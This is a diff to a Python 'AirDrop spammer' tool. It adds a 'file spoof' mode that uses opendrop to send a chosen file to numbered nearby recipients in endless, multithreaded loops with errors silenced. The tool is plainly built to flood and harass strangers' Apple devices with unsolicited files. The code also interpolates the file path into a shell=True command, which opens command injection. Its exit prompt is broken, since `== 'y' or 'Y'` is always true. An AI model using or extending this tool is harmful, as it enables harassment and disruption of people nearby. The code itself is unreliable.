@@ -4,9 +4,11 @@ from colorama import init, Fore, Style
 import time
 import os
 from simple_term_menu import TerminalMenu
+from playsound import playsound
+import tkinter as tk
+from tkinter import filedialog
 
-
-options = ["Spam Airdrop", "Find Computers", "Exit"]
+options = ["Spam Airdrop Links", "Airdrop File Spoof", "Find Computers", "Exit"]
 init()
 
 os.system("clear || cls")
@@ -15,10 +17,11 @@ print(Fore.LIGHTMAGENTA_EX + "AIRDROP SPAMMER MADE BY ZAK")
 def loading_animation():
     animation = "|/-\\"
     start_time = time.time()
-    while time.time() - start_time < 3:
+    while time.time() - start_time < 2:
         for char in animation:
             print(Fore.LIGHTMAGENTA_EX + f" Loading {char}", end="\r")
             time.sleep(0.1)
+            
 
 loading_animation()
 def send_to_recipient(recipient, content_url):
@@ -56,6 +59,49 @@ def main():
 
 
 
+
+def send_spam_file_spoof(recipient, file_path):
+    command = f"opendrop send -r {recipient} -f {file_path}"
+    try:
+        while True:
+            subprocess.run(command, shell=True, check=True, stderr=subprocess.DEVNULL)
+            print(Fore.LIGHTGREEN_EX + f"[+] sent spoofed file to recipient {recipient} successfully.")
+            new_command = f"opendrop send -r {recipient} -f {file_path} "
+            subprocess.run(new_command, shell=True, check=True, stderr=subprocess.DEVNULL)
+            print(Fore.LIGHTYELLOW_EX + f"[+] New airdrop spoofed file sent to recipient {recipient} successfully.")
+            time.sleep(1)
+            
+    except Exception as e:
+        print(Fore.LIGHTRED_EX + f"[-] Error sending to recipient {recipient}")
+
+
+def file_spoof_thread(recipients, file_path):
+    threads = []
+    for recipient in recipients:
+        print(Fore.LIGHTYELLOW_EX + f"[+] Sending airdrop to recipient {recipient}")
+        thread = threading.Thread(target=send_spam_file_spoof, args=(recipient, file_path))
+        thread.start()
+        threads.append(thread)
+    for thread in threads:
+        thread.join()
+
+
+def file_path_new():
+    root = tk.Tk()
+    root.withdraw()  
+    file_path = filedialog.askopenfilename()
+    return file_path
+
+def file_spoof():
+    num_recipients = int(input(Fore.LIGHTMAGENTA_EX + "Enter the number of recipients: ")) + 1
+    path = file_path_new()
+    recipients = list(range(num_recipients))
+    file_path = path
+    print(Fore.LIGHTGREEN_EX + f"[+] Sending airdrop to {num_recipients} recipients with path {path}")
+    while True:
+        file_spoof_thread(recipients, file_path)
+
+
 def main_menu(options): 
     terminal_menu = TerminalMenu(options) 
     terminal_menu._menu_cursor_style = ("fg_purple", "bold")
@@ -74,6 +120,8 @@ def find_Computers():
     except subprocess.CalledProcessError:
         print(Fore.LIGHTRED_EX + f"Error")
     except KeyboardInterrupt:
+       sound_file = "/Users/zakbovis/Desktop/stuff/coding/airdrop-spammer/sounds/Found_Mac.wav"
+       playsound(sound_file)
        os.system("clear")
        print_code()
 
@@ -85,20 +133,28 @@ while True:
     option = main_menu(options) 
     
     match option: 
-        case "Spam Airdrop":
+        case "Spam Airdrop Links":
+            sound_file = "/Users/zakbovis/Desktop/stuff/coding/airdrop-spammer/sounds/Found_Mac.wav"
+            playsound(sound_file)
             main() 
         case "Find Computers":
+            sound_file = "/Users/zakbovis/Desktop/stuff/coding/airdrop-spammer/sounds/Found_Mac.wav"
+            playsound(sound_file)
             os.system("clear")
             print_code()
             find_Computers()
+        case "Airdrop File Spoof":
+                sound_file = "/Users/zakbovis/Desktop/stuff/coding/airdrop-spammer/sounds/Found_Mac.wav"
+                playsound(sound_file)
+                file_spoof()
         case "Exit":
             confirmation = input(Fore.LIGHTRED_EX + "Do you want to exit y/n: ") 
-            if confirmation == "y": 
+            if confirmation == "y" or "Y": 
                 print(Fore.LIGHTRED_EX + "Exiting program") 
                 time.sleep(2.5) 
                 os.system("clear || cls") 
                 exit() 
-            elif confirmation == "n": 
+            elif confirmation == "n" or "N": 
                 print(Fore.LIGHTRED_EX + "Returning back to menu...") 
                 time.sleep(2.5) 
             else:
